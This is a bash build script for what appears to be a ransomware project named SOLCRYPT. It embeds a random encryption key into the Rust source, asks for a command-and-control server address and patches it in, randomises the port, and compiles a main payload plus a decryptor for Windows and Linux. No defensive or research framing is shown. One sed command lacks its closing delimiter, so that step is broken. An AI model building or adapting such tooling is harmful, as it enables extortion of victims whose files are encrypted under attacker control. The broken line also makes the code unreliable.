#! /bin/bash
echo "SOLCRYPT v. 001"
echo "Build Script v. 001"
echo "[!] Preparing..."
cp src/crypto.rs src/crypto.rs.bak
echo "[i] Replacing key with random data."
export KEY="$(tr -dc A-Za-z0-9 </dev/urandom | head -c 32)"
sed -i -e "s/tobereplacedbybuildscript/$KEY/g" src/crypto.rs
read -p "C2 Server Address: " C2ADDR
sed -i -e "s/c2serveraddr/$C2ADDR/g" src/crypto.rs
sed -i -e "s/4444/$RANDOM" src/crypto.rs
echo "[!] Source ready."
PS3='Please select option:'
options=("Windows" "Linux" "Both" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            cargo build --bin solcrypt_main --target x86_64-pc-windows-gnu --release
            cargo build --bin decryptor --target x86_64-pc-windows-gnu --release
            ;;
        "Linux")
            cargo build --bin solcrypt_main --target x86_64-unknown-linux-gnu --release
            cargo build --bin decryptor --target x86_64-unknown-linux-gnu --release
            ;;
        "Both")
            cargo build --bin solcrypt_main --target x86_64-pc-windows-gnu --release
            cargo build --bin decryptor --target x86_64-pc-windows-gnu --release
            cargo build --bin solcrypt_main --target x86_64-unknown-linux-gnu --release
            cargo build --bin decryptor --target x86_64-unknown-linux-gnu --release
            ;;
        "Quit")
            mv src/crypto.rs.bak src/crypto.rs
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
